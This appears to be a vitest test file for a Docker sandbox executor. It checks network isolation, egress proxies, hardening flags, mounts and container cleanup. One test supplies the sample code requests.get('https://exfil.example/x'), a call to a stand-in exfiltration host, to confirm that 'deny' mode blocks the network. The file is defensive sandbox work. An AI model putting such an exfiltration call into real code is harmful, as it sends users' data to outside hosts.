/**
 * Docker executor arg-construction tests. The `run()` wrapper is stubbed, so
 * these assert the EXACT docker command sequences — container create (network
 * gating, bind-mounts), parquet copy-in, stdin data writes, script write,
 * exec — without touching a docker daemon.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

vi.mock("@/lib/sandbox/docker-utils", async (importOriginal) => {
  const actual = await importOriginal<typeof import("@/lib/sandbox/docker-utils")>();
  return {
    ...actual, // codeDoesRemoteIo / codeNeedsNetwork stay real (pure)
    run: vi.fn(),
    parseExecutionOutput: vi.fn(),
  };
});

// The exec is now STREAMED (spawn) — mock it so no real docker is spawned.
const streamExec = vi.fn(async () => ({ exitCode: 0, aborted: false }));
vi.mock("@/lib/sandbox/stream-exec", () => ({
  streamExec: (...a: unknown[]) => streamExec(...(a as [])),
}));

// Egress setup is exercised by its own proof; here we assert the executor
// wires it: internal network name + proxy env on the analysis container.
const setupEgressNetwork = vi.fn(async (runId: string, _hosts: string[]) => ({
  networkName: `hermetic-egress-${runId}`,
  env: { HTTPS_PROXY: "http://gw:3128", HERMETIC_HTTP_PROXY: "http://gw:3128" },
  teardown: egressTeardown,
}));
const egressTeardown = vi.fn(async () => {});
vi.mock("@/lib/sandbox/egress", () => ({
  setupEgressNetwork: (...a: unknown[]) => setupEgressNetwork(...(a as [string, string[]])),
}));

// L3-blocked egress: mocked so we can assert the executor joins the dedicated
// bridge on success and fails SAFE to --network none on failure.
const setupL3BlockedNetwork = vi.fn(async (): Promise<string | null> => "hermetic-sandbox-l3");
vi.mock("@/lib/sandbox/egress-l3", () => ({
  setupL3BlockedNetwork: () => setupL3BlockedNetwork(),
}));

import { executeSandbox } from "@/lib/sandbox/docker-executor";
import { run, parseExecutionOutput } from "@/lib/sandbox/docker-utils";
import { resetDaemonMemoryCacheForTests } from "@/lib/sandbox/memory-budget";

const mockedRun = vi.mocked(run);
const mockedParse = vi.mocked(parseExecutionOutput);

/** All docker invocations as [subcommand, fullArgs]. */
const calls = () => mockedRun.mock.calls.map(([, args]) => args);
const createCall = () => calls().find((a) => a[0] === "run")!;

beforeEach(() => {
  vi.clearAllMocks();
  // Default `docker info` → "0" → memory probe yields null → uncapped run, so
  // the arg-sequence tests below see the same shape they always did.
  resetDaemonMemoryCacheForTests();
  streamExec.mockResolvedValue({ exitCode: 0, aborted: false });
  setupL3BlockedNetwork.mockResolvedValue("hermetic-sandbox-l3");
  mockedRun.mockResolvedValue({ stdout: "0", stderr: "", exitCode: 0 });
  mockedParse.mockResolvedValue({
    success: true,
    results: {},
    chart_data: {},
    images: {},
    datasets: undefined,
    execution_ms: 1,
  });
});

describe("docker executeSandbox", () => {
  it("creates the container with --network none for local-data code", async () => {
    await executeSandbox("a,b\n1,2\n", "import pandas as pd\npd.read_csv('/data/input.csv')");
    const create = createCall();
    expect(create).toContain("--network");
    expect(create[create.indexOf("--network") + 1]).toBe("none");
  });

  it("grants network (no --network none) when the code reads remote data", async () => {
    await executeSandbox("", "duckdb.sql(\"INSTALL httpfs\"); read_parquet('s3://b/x.parquet')");
    expect(createCall()).not.toContain("--network");
  });

  it("bind-mounts a local path read-only and skips the stdin CSV write", async () => {
    await executeSandbox("", "code", { localMountPath: "/Users/me/data" });
    const create = createCall();
    const vIdx = create.indexOf("-v");
    expect(vIdx).toBeGreaterThan(-1);
    expect(create[vIdx + 1]).toMatch(/^\/Users\/me\/data:.*:ro$/);
    // No `cat > /data/input.csv` exec when data comes from the mount.
    const stdinWrites = calls().filter((a) => a.join(" ").includes("cat > /data/input.csv"));
    expect(stdinWrites).toHaveLength(0);
  });

  it("docker-cps a materialized parquet into the container", async () => {
    await executeSandbox("", "code", { inputParquetPath: "/tmp/m.parquet" });
    const cp = calls().find((a) => a[0] === "cp");
    expect(cp).toBeDefined();
    expect(cp![1]).toBe("/tmp/m.parquet");
    expect(cp![2]).toMatch(/:\/data\/input\.parquet$/);
  });

  it("writes the CSV via stdin and the script with the NaN prelude, then executes", async () => {
    await executeSandbox("a,b\n1,2\n", "print('hi')");
    const joined = calls().map((a) => a.join(" "));
    expect(joined.some((c) => c.includes("cat > /data/input.csv"))).toBe(true);
    expect(joined.some((c) => c.includes("cat > /data/script.py"))).toBe(true);
    // Execution is now streamed (spawn), not a blocking run() call.
    expect(streamExec).toHaveBeenCalledOnce();
    // Script content includes the prelude before the generated code.
    const scriptWrite = mockedRun.mock.calls.find(([, args]) =>
      args.join(" ").includes("cat > /data/script.py")
    )!;
    const input = (scriptWrite[2] as { input?: string })?.input ?? "";
    expect(input).toContain("print('hi')");
    expect(input.indexOf("print('hi')")).toBeGreaterThan(0); // prelude first
  });

  it("always removes the container, even when execution throws", async () => {
    // Reject container CREATION specifically — the `docker info` memory probe
    // may run first and is allowed to no-op (it fails soft to an uncapped run).
    mockedRun.mockImplementation(async (_cmd, args) => {
      if (args[0] === "run") throw new Error("docker daemon down");
      return { stdout: "0", stderr: "", exitCode: 0 };
    });
    const result = await executeSandbox("csv", "code");
    expect(result.success).toBe(false);
    const rm = calls().find((a) => a[0] === "rm");
    expect(rm).toBeDefined();
    expect(rm).toContain("-f");
  });

  it("caps container memory with --memory when the daemon allocation is known", async () => {
    const GiB = 1024 * 1024 * 1024;
    mockedRun.mockImplementation(async (_cmd, args) => {
      if (args[0] === "info") return { stdout: `${4 * GiB}\n`, stderr: "", exitCode: 0 };
      return { stdout: "0", stderr: "", exitCode: 0 };
    });
    await executeSandbox("a,b\n1,2\n", "import pandas as pd");
    const create = createCall();
    const mIdx = create.indexOf("--memory");
    expect(mIdx).toBeGreaterThan(-1);
    expect(create[mIdx + 1]).toBe(`${Math.floor(4 * 1024 * 0.8)}m`);
  });

  it("returns a stopped result (no retry) when the user aborts mid-execution", async () => {
    // The streaming runner resolves with aborted:true when the run's signal fires.
    streamExec.mockResolvedValue({ exitCode: -1, aborted: true });
    const result = await executeSandbox("csv", "code");
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.errorKind).toBe("stopped");
      expect(result.error).toMatch(/stopped/i);
    }
    // Container is still torn down.
    expect(calls().find((a) => a[0] === "rm")).toBeDefined();
  });

  it("creates the container with sleep infinity (no lifetime self-kill)", async () => {
    await executeSandbox("a,b\n1,2\n", "print('hi')");
    const create = createCall();
    const sleepIdx = create.indexOf("sleep");
    expect(create[sleepIdx + 1]).toBe("infinity");
  });

  it('network "deny" forces --network none even for remote-IO code (MCP M4)', async () => {
    await executeSandbox("a\n1\n", "import requests\nrequests.get('https://exfil.example/x')", {
      network: "deny",
    });
    const create = createCall();
    expect(create).toContain("--network");
    expect(create[create.indexOf("--network") + 1]).toBe("none");
  });

  it('network "auto" (default) still grants network to remote-IO code', async () => {
    await executeSandbox("a\n1\n", "duckdb.sql(\"select * from 's3://bucket/x.parquet'\")");
    const create = createCall();
    expect(create).not.toContain("--network");
  });

  it("allowedEgressHosts: joins the internal network with proxy env; teardown runs (MCP egress)", async () => {
    await executeSandbox("a\n1\n", "duckdb.sql(\"select * from 's3://b/x.parquet'\")", {
      allowedEgressHosts: ["b.s3.amazonaws.com", "s3.amazonaws.com"],
    });
    expect(setupEgressNetwork).toHaveBeenCalledWith(expect.any(String), [
      "b.s3.amazonaws.com",
      "s3.amazonaws.com",
    ]);
    const create = createCall();
    const netIdx = create.indexOf("--network");
    expect(String(create[netIdx + 1])).toMatch(/^hermetic-egress-/);
    expect(create).toContain("-e");
    expect(create).toContain("HERMETIC_HTTP_PROXY=http://gw:3128");
    expect(egressTeardown).toHaveBeenCalled();
  });

  it("network deny wins over allowedEgressHosts (no egress setup at all)", async () => {
    await executeSandbox("a\n1\n", "import requests", {
      network: "deny",
      allowedEgressHosts: ["x.example.com"],
    });
    expect(setupEgressNetwork).not.toHaveBeenCalled();
    const create = createCall();
    expect(create[create.indexOf("--network") + 1]).toBe("none");
  });

  it("applies container hardening flags to every run (finding M10)", async () => {
    await executeSandbox("a,b\n1,2\n", "print('hi')");
    const create = createCall();
    expect(create).toContain("--pids-limit");
    expect(create).toContain("--cpus");
    expect(create).toContain("--security-opt");
    expect(create[create.indexOf("--security-opt") + 1]).toBe("no-new-privileges");
    expect(create).toContain("--cap-drop");
    expect(create[create.indexOf("--cap-drop") + 1]).toBe("ALL");
  });

  it("l3BlockedEgress: joins the dedicated L3 bridge (finding 04)", async () => {
    await executeSandbox("a\n1\n", "duckdb.sql(\"select * from 's3://pub/x.parquet'\")", {
      l3BlockedEgress: true,
    });
    expect(setupL3BlockedNetwork).toHaveBeenCalled();
    expect(setupEgressNetwork).not.toHaveBeenCalled();
    const create = createCall();
    expect(create[create.indexOf("--network") + 1]).toBe("hermetic-sandbox-l3");
  });

  it("l3BlockedEgress fails SAFE to --network none when the bridge can't be set up", async () => {
    setupL3BlockedNetwork.mockResolvedValueOnce(null); // no NET_ADMIN / iptables missing
    await executeSandbox("a\n1\n", "duckdb.sql(\"select * from 's3://pub/x.parquet'\")", {
      l3BlockedEgress: true,
    });
    const create = createCall();
    expect(create[create.indexOf("--network") + 1]).toBe("none");
  });
});
